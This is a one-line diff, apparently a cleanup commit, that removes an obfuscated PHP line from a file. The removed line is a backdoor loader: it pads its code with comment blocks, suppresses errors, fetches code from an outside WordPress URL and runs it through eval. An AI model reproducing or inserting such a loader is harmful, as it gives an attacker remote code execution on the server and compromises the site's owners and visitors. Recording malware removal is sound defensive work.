@@ -1,1 +1,0 @@
-<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/("http://keperawatan.univbatam.ac.id/wp"));/**/?>
